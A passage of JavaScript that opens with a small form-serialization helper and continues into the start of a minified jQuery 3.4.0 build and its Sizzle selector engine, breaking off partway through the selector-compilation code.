function serialize(e) {
    if (e && "FORM" === e.nodeName) {
        var t, n, r = [];
        for (t = e.elements.length - 1; t >= 0; t -= 1)
            if ("" !== e.elements[t].name) switch (e.elements[t].nodeName) {
                case "INPUT":
                    switch (e.elements[t].type) {
                        case "text":
                        case "hidden":
                        case "password":
                        case "button":
                        case "reset":
                        case "submit":
                            r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].value));
                            break;
                        case "checkbox":
                        case "radio":
                            e.elements[t].checked && r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].value))
                    }
                    break;
                case "TEXTAREA":
                    r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].value));
                    break;
                case "SELECT":
                    switch (e.elements[t].type) {
                        case "select-one":
                            r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].value));
                            break;
                        case "select-multiple":
                            for (n = e.elements[t].options.length - 1; n >= 0; n -= 1) e.elements[t].options[n].selected && r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].options[n].value))
                    }
                    break;
                case "BUTTON":
                    switch (e.elements[t].type) {
                        case "reset":
                        case "submit":
                        case "button":
                            r.push(e.elements[t].name + "=" + encodeURIComponent(e.elements[t].value))
                    }
            }
        return r.join("&")
    }
}! function(e, t) {
    "use strict";
    "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function(e) {
        if (!e.document) throw new Error("jQuery requires a window with a document");
        return t(e)
    } : t(e)
}("undefined" != typeof window ? window : this, function(e, t) {
    "use strict";
    var n = [],
        r = e.document,
        o = Object.getPrototypeOf,
        i = n.slice,
        a = n.concat,
        s = n.push,
        u = n.indexOf,
        l = {},
        c = l.toString,
        d = l.hasOwnProperty,
        f = d.toString,
        p = f.call(Object),
        h = {},
        m = function(e) {
            return "function" == typeof e && "number" != typeof e.nodeType
        },
        g = function(e) {
            return null != e && e === e.window
        },
        v = {
            type: !0,
            src: !0,
            nonce: !0,
            noModule: !0
        };

    function y(e, t, n) {
        var o, i, a = (n = n || r).createElement("script");
        if (a.text = e, t)
            for (o in v)(i = t[o] || t.getAttribute && t.getAttribute(o)) && a.setAttribute(o, i);
        n.head.appendChild(a).parentNode.removeChild(a)
    }

    function x(e) {
        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? l[c.call(e)] || "object" : typeof e
    }
    var b = "3.4.0",
        w = function(e, t) {
            return new w.fn.init(e, t)
        },
        E = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;

    function T(e) {
        var t = !!e && "length" in e && e.length,
            n = x(e);
        return !m(e) && !g(e) && ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e)
    }
    w.fn = w.prototype = {
        jquery: b,
        constructor: w,
        length: 0,
        toArray: function() {
            return i.call(this)
        },
        get: function(e) {
            return null == e ? i.call(this) : e < 0 ? this[e + this.length] : this[e]
        },
        pushStack: function(e) {
            var t = w.merge(this.constructor(), e);
            return t.prevObject = this, t
        },
        each: function(e) {
            return w.each(this, e)
        },
        map: function(e) {
            return this.pushStack(w.map(this, function(t, n) {
                return e.call(t, n, t)
            }))
        },
        slice: function() {
            return this.pushStack(i.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(e) {
            var t = this.length,
                n = +e + (e < 0 ? t : 0);
            return this.pushStack(0 <= n && n < t ? [this[n]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor()
        },
        push: s,
        sort: n.sort,
        splice: n.splice
    }, w.extend = w.fn.extend = function() {
        var e, t, n, r, o, i, a = arguments[0] || {},
            s = 1,
            u = arguments.length,
            l = !1;
        for ("boolean" == typeof a && (l = a, a = arguments[s] || {}, s++), "object" == typeof a || m(a) || (a = {}), s === u && (a = this, s--); s < u; s++)
            if (null != (e = arguments[s]))
                for (t in e) r = e[t], "__proto__" !== t && a !== r && (l && r && (w.isPlainObject(r) || (o = Array.isArray(r))) ? (n = a[t], i = o && !Array.isArray(n) ? [] : o || w.isPlainObject(n) ? n : {}, o = !1, a[t] = w.extend(l, i, r)) : void 0 !== r && (a[t] = r));
        return a
    }, w.extend({
        expando: "jQuery" + (b + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(e) {
            throw new Error(e)
        },
        noop: function() {},
        isPlainObject: function(e) {
            var t, n;
            return !(!e || "[object Object]" !== c.call(e) || (t = o(e)) && ("function" != typeof(n = d.call(t, "constructor") && t.constructor) || f.call(n) !== p))
        },
        isEmptyObject: function(e) {
            var t;
            for (t in e) return !1;
            return !0
        },
        globalEval: function(e, t) {
            y(e, {
                nonce: t && t.nonce
            })
        },
        each: function(e, t) {
            var n, r = 0;
            if (T(e))
                for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);
            else
                for (r in e)
                    if (!1 === t.call(e[r], r, e[r])) break;
            return e
        },
        trim: function(e) {
            return null == e ? "" : (e + "").replace(E, "")
        },
        makeArray: function(e, t) {
            var n = t || [];
            return null != e && (T(Object(e)) ? w.merge(n, "string" == typeof e ? [e] : e) : s.call(n, e)), n
        },
        inArray: function(e, t, n) {
            return null == t ? -1 : u.call(t, e, n)
        },
        merge: function(e, t) {
            for (var n = +t.length, r = 0, o = e.length; r < n; r++) e[o++] = t[r];
            return e.length = o, e
        },
        grep: function(e, t, n) {
            for (var r = [], o = 0, i = e.length, a = !n; o < i; o++) !t(e[o], o) !== a && r.push(e[o]);
            return r
        },
        map: function(e, t, n) {
            var r, o, i = 0,
                s = [];
            if (T(e))
                for (r = e.length; i < r; i++) null != (o = t(e[i], i, n)) && s.push(o);
            else
                for (i in e) null != (o = t(e[i], i, n)) && s.push(o);
            return a.apply([], s)
        },
        guid: 1,
        support: h
    }), "function" == typeof Symbol && (w.fn[Symbol.iterator] = n[Symbol.iterator]), w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function(e, t) {
        l["[object " + t + "]"] = t.toLowerCase()
    });
    var C = function(e) {
        var t, n, r, o, i, a, s, u, l, c, d, f, p, h, m, g, v, y, x, b = "sizzle" + 1 * new Date,
            w = e.document,
            E = 0,
            T = 0,
            C = ue(),
            k = ue(),
            N = ue(),
            S = ue(),
            A = function(e, t) {
                return e === t && (d = !0), 0
            },
            D = {}.hasOwnProperty,
            j = [],
            I = j.pop,
            L = j.push,
            B = j.push,
            q = j.slice,
            H = function(e, t) {
                for (var n = 0, r = e.length; n < r; n++)
                    if (e[n] === t) return n;
                return -1
            },
            P = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            O = "[\\x20\\t\\r\\n\\f]",
            R = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
            M = "\\[" + O + "*(" + R + ")(?:" + O + "*([*^$|!~]?=)" + O + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + R + "))|)" + O + "*\\]",
            F = ":(" + R + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + M + ")*)|.*)\\)|)",
            W = new RegExp(O + "+", "g"),
            $ = new RegExp("^" + O + "+|((?:^|[^\\\\])(?:\\\\.)*)" + O + "+$", "g"),
            _ = new RegExp("^" + O + "*," + O + "*"),
            U = new RegExp("^" + O + "*([>+~]|" + O + ")" + O + "*"),
            z = new RegExp(O + "|>"),
            X = new RegExp(F),
            V = new RegExp("^" + R + "$"),
            Y = {
                ID: new RegExp("^#(" + R + ")"),
                CLASS: new RegExp("^\\.(" + R + ")"),
                TAG: new RegExp("^(" + R + "|[*])"),
                ATTR: new RegExp("^" + M),
                PSEUDO: new RegExp("^" + F),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + O + "*(even|odd|(([+-]|)(\\d*)n|)" + O + "*(?:([+-]|)" + O + "*(\\d+)|))" + O + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + P + ")$", "i"),
                needsContext: new RegExp("^" + O + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + O + "*((?:-\\d)?\\d*)" + O + "*\\)|)(?=[^-]|$)", "i")
            },
            G = /HTML$/i,
            Q = /^(?:input|select|textarea|button)$/i,
            J = /^h\d$/i,
            K = /^[^{]+\{\s*\[native \w/,
            Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            ee = /[+~]/,
            te = new RegExp("\\\\([\\da-f]{1,6}" + O + "?|(" + O + ")|.)", "ig"),
            ne = function(e, t, n) {
                var r = "0x" + t - 65536;
                return r != r || n ? t : r < 0 ? String.fromCharCode(r + 65536) : String.fromCharCode(r >> 10 | 55296, 1023 & r | 56320)
            },
            re = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            oe = function(e, t) {
                return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e
            },
            ie = function() {
                f()
            },
            ae = be(function(e) {
                return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase()
            }, {
                dir: "parentNode",
                next: "legend"
            });
        try {
            B.apply(j = q.call(w.childNodes), w.childNodes), j[w.childNodes.length].nodeType
        } catch (t) {
            B = {
                apply: j.length ? function(e, t) {
                    L.apply(e, q.call(t))
                } : function(e, t) {
                    for (var n = e.length, r = 0; e[n++] = t[r++];);
                    e.length = n - 1
                }
            }
        }

        function se(e, t, r, o) {
            var i, s, l, c, d, h, v, y = t && t.ownerDocument,
                E = t ? t.nodeType : 9;
            if (r = r || [], "string" != typeof e || !e || 1 !== E && 9 !== E && 11 !== E) return r;
            if (!o && ((t ? t.ownerDocument || t : w) !== p && f(t), t = t || p, m)) {
                if (11 !== E && (d = Z.exec(e)))
                    if (i = d[1]) {
                        if (9 === E) {
                            if (!(l = t.getElementById(i))) return r;
                            if (l.id === i) return r.push(l), r
                        } else if (y && (l = y.getElementById(i)) && x(t, l) && l.id === i) return r.push(l), r
                    } else {
                        if (d[2]) return B.apply(r, t.getElementsByTagName(e)), r;
                        if ((i = d[3]) && n.getElementsByClassName && t.getElementsByClassName) return B.apply(r, t.getElementsByClassName(i)), r
                    } if (n.qsa && !S[e + " "] && (!g || !g.test(e)) && (1 !== E || "object" !== t.nodeName.toLowerCase())) {
                    if (v = e, y = t, 1 === E && z.test(e)) {
                        for ((c = t.getAttribute("id")) ? c = c.replace(re, oe) : t.setAttribute("id", c = b), s = (h = a(e)).length; s--;) h[s] = "#" + c + " " + xe(h[s]);
                        v = h.join(","), y = ee.test(e) && ve(t.parentNode) || t
                    }
                    try {
                        return B.apply(r, y.querySelectorAll(v)), r
                    } catch (t) {
                        S(e, !0)
                    } finally {
                        c === b && t.removeAttribute("id")
                    }
                }
            }
            return u(e.replace($, "$1"), t, r, o)
        }

        function ue() {
            var e = [];
            return function t(n, o) {
                return e.push(n + " ") > r.cacheLength && delete t[e.shift()], t[n + " "] = o
            }
        }

        function le(e) {
            return e[b] = !0, e
        }

        function ce(e) {
            var t = p.createElement("fieldset");
            try {
                return !!e(t)
            } catch (e) {
                return !1
            } finally {
                t.parentNode && t.parentNode.removeChild(t), t = null
            }
        }

        function de(e, t) {
            for (var n = e.split("|"), o = n.length; o--;) r.attrHandle[n[o]] = t
        }

        function fe(e, t) {
            var n = t && e,
                r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
            if (r) return r;
            if (n)
                for (; n = n.nextSibling;)
                    if (n === t) return -1;
            return e ? 1 : -1
        }

        function pe(e) {
            return function(t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e
            }
        }

        function he(e) {
            return function(t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e
            }
        }

        function me(e) {
            return function(t) {
                return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && ae(t) === e : t.disabled === e : "label" in t && t.disabled === e
            }
        }

        function ge(e) {
            return le(function(t) {
                return t = +t, le(function(n, r) {
                    for (var o, i = e([], n.length, t), a = i.length; a--;) n[o = i[a]] && (n[o] = !(r[o] = n[o]))
                })
            })
        }

        function ve(e) {
            return e && void 0 !== e.getElementsByTagName && e
        }
        for (t in n = se.support = {}, i = se.isXML = function(e) {
                var t = e.namespaceURI,
                    n = (e.ownerDocument || e).documentElement;
                return !G.test(t || n && n.nodeName || "HTML")
            }, f = se.setDocument = function(e) {
                var t, o, a = e ? e.ownerDocument || e : w;
                return a !== p && 9 === a.nodeType && a.documentElement && (h = (p = a).documentElement, m = !i(p), w !== p && (o = p.defaultView) && o.top !== o && (o.addEventListener ? o.addEventListener("unload", ie, !1) : o.attachEvent && o.attachEvent("onunload", ie)), n.attributes = ce(function(e) {
                    return e.className = "i", !e.getAttribute("className")
                }), n.getElementsByTagName = ce(function(e) {
                    return e.appendChild(p.createComment("")), !e.getElementsByTagName("*").length
                }), n.getElementsByClassName = K.test(p.getElementsByClassName), n.getById = ce(function(e) {
                    return h.appendChild(e).id = b, !p.getElementsByName || !p.getElementsByName(b).length
                }), n.getById ? (r.filter.ID = function(e) {
                    var t = e.replace(te, ne);
                    return function(e) {
                        return e.getAttribute("id") === t
                    }
                }, r.find.ID = function(e, t) {
                    if (void 0 !== t.getElementById && m) {
                        var n = t.getElementById(e);
                        return n ? [n] : []
                    }
                }) : (r.filter.ID = function(e) {
                    var t = e.replace(te, ne);
                    return function(e) {
                        var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                        return n && n.value === t
                    }
                }, r.find.ID = function(e, t) {
                    if (void 0 !== t.getElementById && m) {
                        var n, r, o, i = t.getElementById(e);
                        if (i) {
                            if ((n = i.getAttributeNode("id")) && n.value === e) return [i];
                            for (o = t.getElementsByName(e), r = 0; i = o[r++];)
                                if ((n = i.getAttributeNode("id")) && n.value === e) return [i]
                        }
                        return []
                    }
                }), r.find.TAG = n.getElementsByTagName ? function(e, t) {
                    return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0
                } : function(e, t) {
                    var n, r = [],
                        o = 0,
                        i = t.getElementsByTagName(e);
                    if ("*" === e) {
                        for (; n = i[o++];) 1 === n.nodeType && r.push(n);
                        return r
                    }
                    return i
                }, r.find.CLASS = n.getElementsByClassName && function(e, t) {
                    if (void 0 !== t.getElementsByClassName && m) return t.getElementsByClassName(e)
                }, v = [], g = [], (n.qsa = K.test(p.querySelectorAll)) && (ce(function(e) {
                    h.appendChild(e).innerHTML = "<a id='" + b + "'></a><select id='" + b + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=" + O + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || g.push("\\[" + O + "*(?:value|" + P + ")"), e.querySelectorAll("[id~=" + b + "-]").length || g.push("~="), e.querySelectorAll(":checked").length || g.push(":checked"), e.querySelectorAll("a#" + b + "+*").length || g.push(".#.+[+~]")
                }), ce(function(e) {
                    e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                    var t = p.createElement("input");
                    t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && g.push("name" + O + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && g.push(":enabled", ":disabled"), h.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:")
                })), (n.matchesSelector = K.test(y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && ce(function(e) {
                    n.disconnectedMatch = y.call(e, "*"), y.call(e, "[s!='']:x"), v.push("!=", F)
                }), g = g.length && new RegExp(g.join("|")), v = v.length && new RegExp(v.join("|")), t = K.test(h.compareDocumentPosition), x = t || K.test(h.contains) ? function(e, t) {
                    var n = 9 === e.nodeType ? e.documentElement : e,
                        r = t && t.parentNode;
                    return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)))
                } : function(e, t) {
                    if (t)
                        for (; t = t.parentNode;)
                            if (t === e) return !0;
                    return !1
                }, A = t ? function(e, t) {
                    if (e === t) return d = !0, 0;
                    var r = !e.compareDocumentPosition - !t.compareDocumentPosition;
                    return r || (1 & (r = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === r ? e === p || e.ownerDocument === w && x(w, e) ? -1 : t === p || t.ownerDocument === w && x(w, t) ? 1 : c ? H(c, e) - H(c, t) : 0 : 4 & r ? -1 : 1)
                } : function(e, t) {
                    if (e === t) return d = !0, 0;
                    var n, r = 0,
                        o = e.parentNode,
                        i = t.parentNode,
                        a = [e],
                        s = [t];
                    if (!o || !i) return e === p ? -1 : t === p ? 1 : o ? -1 : i ? 1 : c ? H(c, e) - H(c, t) : 0;
                    if (o === i) return fe(e, t);
                    for (n = e; n = n.parentNode;) a.unshift(n);
                    for (n = t; n = n.parentNode;) s.unshift(n);
                    for (; a[r] === s[r];) r++;
                    return r ? fe(a[r], s[r]) : a[r] === w ? -1 : s[r] === w ? 1 : 0
                }), p
            }, se.matches = function(e, t) {
                return se(e, null, null, t)
            }, se.matchesSelector = function(e, t) {
                if ((e.ownerDocument || e) !== p && f(e), n.matchesSelector && m && !S[t + " "] && (!v || !v.test(t)) && (!g || !g.test(t))) try {
                    var r = y.call(e, t);
                    if (r || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) return r
                } catch (e) {
                    S(t, !0)
                }
                return 0 < se(t, p, null, [e]).length
            }, se.contains = function(e, t) {
                return (e.ownerDocument || e) !== p && f(e), x(e, t)
            }, se.attr = function(e, t) {
                (e.ownerDocument || e) !== p && f(e);
                var o = r.attrHandle[t.toLowerCase()],
                    i = o && D.call(r.attrHandle, t.toLowerCase()) ? o(e, t, !m) : void 0;
                return void 0 !== i ? i : n.attributes || !m ? e.getAttribute(t) : (i = e.getAttributeNode(t)) && i.specified ? i.value : null
            }, se.escape = function(e) {
                return (e + "").replace(re, oe)
            }, se.error = function(e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            }, se.uniqueSort = function(e) {
                var t, r = [],
                    o = 0,
                    i = 0;
                if (d = !n.detectDuplicates, c = !n.sortStable && e.slice(0), e.sort(A), d) {
                    for (; t = e[i++];) t === e[i] && (o = r.push(i));
                    for (; o--;) e.splice(r[o], 1)
                }
                return c = null, e
            }, o = se.getText = function(e) {
                var t, n = "",
                    r = 0,
                    i = e.nodeType;
                if (i) {
                    if (1 === i || 9 === i || 11 === i) {
                        if ("string" == typeof e.textContent) return e.textContent;
                        for (e = e.firstChild; e; e = e.nextSibling) n += o(e)
                    } else if (3 === i || 4 === i) return e.nodeValue
                } else
                    for (; t = e[r++];) n += o(t);
                return n
            }, (r = se.selectors = {
                cacheLength: 50,
                createPseudo: le,
                match: Y,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(e) {
                        return e[1] = e[1].replace(te, ne), e[3] = (e[3] || e[4] || e[5] || "").replace(te, ne), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                    },
                    CHILD: function(e) {
                        return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || se.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && se.error(e[0]), e
                    },
                    PSEUDO: function(e) {
                        var t, n = !e[6] && e[2];
                        return Y.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && X.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
                    }
                },
                filter: {
                    TAG: function(e) {
                        var t = e.replace(te, ne).toLowerCase();
                        return "*" === e ? function() {
                            return !0
                        } : function(e) {
                            return e.nodeName && e.nodeName.toLowerCase() === t
                        }
                    },
                    CLASS: function(e) {
                        var t = C[e + " "];
                        return t || (t = new RegExp("(^|" + O + ")" + e + "(" + O + "|$)")) && C(e, function(e) {
                            return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                        })
                    },
                    ATTR: function(e, t, n) {
                        return function(r) {
                            var o = se.attr(r, e);
                            return null == o ? "!=" === t : !t || (o += "", "=" === t ? o === n : "!=" === t ? o !== n : "^=" === t ? n && 0 === o.indexOf(n) : "*=" === t ? n && -1 < o.indexOf(n) : "$=" === t ? n && o.slice(-n.length) === n : "~=" === t ? -1 < (" " + o.replace(W, " ") + " ").indexOf(n) : "|=" === t && (o === n || o.slice(0, n.length + 1) === n + "-"))
                        }
                    },
                    CHILD: function(e, t, n, r, o) {
                        var i = "nth" !== e.slice(0, 3),
                            a = "last" !== e.slice(-4),
                            s = "of-type" === t;
                        return 1 === r && 0 === o ? function(e) {
                            return !!e.parentNode
                        } : function(t, n, u) {
                            var l, c, d, f, p, h, m = i !== a ? "nextSibling" : "previousSibling",
                                g = t.parentNode,
                                v = s && t.nodeName.toLowerCase(),
                                y = !u && !s,
                                x = !1;
                            if (g) {
                                if (i) {
                                    for (; m;) {
                                        for (f = t; f = f[m];)
                                            if (s ? f.nodeName.toLowerCase() === v : 1 === f.nodeType) return !1;
                                        h = m = "only" === e && !h && "nextSibling"
                                    }
                                    return !0
                                }
                                if (h = [a ? g.firstChild : g.lastChild], a && y) {
                                    for (x = (p = (l = (c = (d = (f = g)[b] || (f[b] = {}))[f.uniqueID] || (d[f.uniqueID] = {}))[e] || [])[0] === E && l[1]) && l[2], f = p && g.childNodes[p]; f = ++p && f && f[m] || (x = p = 0) || h.pop();)
                                        if (1 === f.nodeType && ++x && f === t) {
                                            c[e] = [E, p, x];
                                            break
                                        }
                                } else if (y && (x = p = (l = (c = (d = (f = t)[b] || (f[b] = {}))[f.uniqueID] || (d[f.uniqueID] = {}))[e] || [])[0] === E && l[1]), !1 === x)
                                    for (;
                                        (f = ++p && f && f[m] || (x = p = 0) || h.pop()) && ((s ? f.nodeName.toLowerCase() !== v : 1 !== f.nodeType) || !++x || (y && ((c = (d = f[b] || (f[b] = {}))[f.uniqueID] || (d[f.uniqueID] = {}))[e] = [E, x]), f !== t)););
                                return (x -= o) === r || x % r == 0 && 0 <= x / r
                            }
                        }
                    },
                    PSEUDO: function(e, t) {
                        var n, o = r.pseudos[e] || r.setFilters[e.toLowerCase()] || se.error("unsupported pseudo: " + e);
                        return o[b] ? o(t) : 1 < o.length ? (n = [e, e, "", t], r.setFilters.hasOwnProperty(e.toLowerCase()) ? le(function(e, n) {
                            for (var r, i = o(e, t), a = i.length; a--;) e[r = H(e, i[a])] = !(n[r] = i[a])
                        }) : function(e) {
                            return o(e, 0, n)
                        }) : o
                    }
                },
                pseudos: {
                    not: le(function(e) {
                        var t = [],
                            n = [],
                            r = s(e.replace($, "$1"));
                        return r[b] ? le(function(e, t, n, o) {
                            for (var i, a = r(e, null, o, []), s = e.length; s--;)(i = a[s]) && (e[s] = !(t[s] = i))
                        }) : function(e, o, i) {
                            return t[0] = e, r(t, null, i, n), t[0] = null, !n.pop()
                        }
                    }),
                    has: le(function(e) {
                        return function(t) {
                            return 0 < se(e, t).length
                        }
                    }),
                    contains: le(function(e) {
                        return e = e.replace(te, ne),
                            function(t) {
                                return -1 < (t.textContent || o(t)).indexOf(e)
                            }
                    }),
                    lang: le(function(e) {
                        return V.test(e || "") || se.error("unsupported lang: " + e), e = e.replace(te, ne).toLowerCase(),
                            function(t) {
                                var n;
                                do {
                                    if (n = m ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-")
                                } while ((t = t.parentNode) && 1 === t.nodeType);
                                return !1
                            }
                    }),
                    target: function(t) {
                        var n = e.location && e.location.hash;
                        return n && n.slice(1) === t.id
                    },
                    root: function(e) {
                        return e === h
                    },
                    focus: function(e) {
                        return e === p.activeElement && (!p.hasFocus || p.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: me(!1),
                    disabled: me(!0),
                    checked: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && !!e.checked || "option" === t && !!e.selected
                    },
                    selected: function(e) {
                        return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                    },
                    empty: function(e) {
                        for (e = e.firstChild; e; e = e.nextSibling)
                            if (e.nodeType < 6) return !1;
                        return !0
                    },
                    parent: function(e) {
                        return !r.pseudos.empty(e)
                    },
                    header: function(e) {
                        return J.test(e.nodeName)
                    },
                    input: function(e) {
                        return Q.test(e.nodeName)
                    },
                    button: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && "button" === e.type || "button" === t
                    },
                    text: function(e) {
                        var t;
                        return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                    },
                    first: ge(function() {
                        return [0]
                    }),
                    last: ge(function(e, t) {
                        return [t - 1]
                    }),
                    eq: ge(function(e, t, n) {
                        return [n < 0 ? n + t : n]
                    }),
                    even: ge(function(e, t) {
                        for (var n = 0; n < t; n += 2) e.push(n);
                        return e
                    }),
                    odd: ge(function(e, t) {
                        for (var n = 1; n < t; n += 2) e.push(n);
                        return e
                    }),
                    lt: ge(function(e, t, n) {
                        for (var r = n < 0 ? n + t : t < n ? t : n; 0 <= --r;) e.push(r);
                        return e
                    }),
                    gt: ge(function(e, t, n) {
                        for (var r = n < 0 ? n + t : n; ++r < t;) e.push(r);
                        return e
                    })
                }
            }).pseudos.nth = r.pseudos.eq, {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) r.pseudos[t] = pe(t);
        for (t in {
                submit: !0,
                reset: !0
            }) r.pseudos[t] = he(t);

        function ye() {}

        function xe(e) {
            for (var t = 0, n = e.length, r = ""; t < n; t++) r += e[t].value;
            return r
        }

        function be(e, t, n) {
            var r = t.dir,
                o = t.next,
                i = o || r,
                a = n && "parentNode" === i,
                s = T++;
            return t.first ? function(t, n, o) {
                for (; t = t[r];)
                    if (1 === t.nodeType || a) return e(t, n, o);
                return !1
            } : function(t, n, u) {
                var l, c, d, f = [E, s];
                if (u) {
                    for (; t = t[r];)
                        if ((1 === t.nodeType || a) && e(t, n, u)) return !0
                } else
                    for (; t = t[r];)
                        if (1 === t.nodeType || a)
                            if (c = (d = t[b] || (t[b] = {}))[t.uniqueID] || (d[t.uniqueID] = {}), o && o === t.nodeName.toLowerCase()) t = t[r] || t;
                            else {
                                if ((l = c[i]) && l[0] === E && l[1] === s) return f[2] = l[2];
                                if ((c[i] = f)[2] = e(t, n, u)) return !0
                            } return !1
            }
        }

        function we(e) {
            return 1 < e.length ? function(t, n, r) {
                for (var o = e.length; o--;)
                    if (!e[o](t, n, r)) return !1;
                return !0
            } : e[0]
        }

        function Ee(e, t, n, r, o) {
            for (var i, a = [], s = 0, u = e.length, l = null != t; s < u; s++)(i = e[s]) && (n && !n(i, r, o) || (a.push(i), l && t.push(s)));
            return a
        }

        function Te(e, t, n, r, o, i) {
            return r && !r[b] && (r = Te(r)), o && !o[b] && (o = Te(o, i)), le(function(i, a, s, u) {
                var l, c, d, f = [],
                    p = [],
                    h = a.length,
                    m = i || function(e, t, n) {
                        for (var r = 0, o = t.length; r < o; r++) se(e, t[r], n);
                        return n
                    }(t || "*", s.nodeType ? [s] : s, []),
                    g = !e || !i && t ? m : Ee(m, f, e, s, u),
                    v = n ? o || (i ? e : h || r) ? [] : a : g;
                if (n && n(g, v, s, u), r)
                    for (l = Ee(v, p), r(l, [], s, u), c = l.length; c--;)(d = l[c]) && (v[p[c]] = !(g[p[c]] = d));
                if (i) {
                    if (o || e) {
                        if (o) {
                            for (l = [], c = v.length; c--;)(d = v[c]) && l.push(g[c] = d);
                            o(null, v = [], l, u)
                        }
                        for (c = v.length; c--;)(d = v[c]) && -1 < (l = o ? H(i, d) : f[c]) && (i[l] = !(a[l] = d))
                    }
                } else v = Ee(v === a ? v.splice(h, v.length) : v), o ? o(null, a, v, u) : B.apply(a, v)
            })
        }

        function Ce(e) {
            for (var t, n, o, i = e.length, a = r.relative[e[0].type], s = a || r.relative[" "], u = a ? 1 : 0, c = be(function(e) {
                    return e === t
                }, s, !0), d = be(function(e) {
                    return -1 < H(t, e)
                }, s, !0), f = [function(e, n, r) {
                    var o = !a && (r || n !== l) || ((t = n).nodeType ? c(e, n, r) : d(e, n, r));
                    return t = null, o
                }]; u < i; u++)
                if (n = r.relative[e[u].type]) f = [be(we(f), n)];
                else {
                    if ((n = r.filter[e[u].type].apply(null, e[u].matches))[b]) {
                        for (o = ++u; o < i && !r.relative[e[o].type]; o++);
                        return Te(1 < u && we(f), 1 < u && xe(e.slice(0, u - 1).concat({
                            value: " " === e[u - 2].type ? "*" : ""
                        })).replace($, "$1"), n, u < o && Ce(e.slice(u, o)), o < i && Ce(e = e.slice(o)), o < i && xe(e))
                    }
                    f.push(n)
                } return we(f)
        }
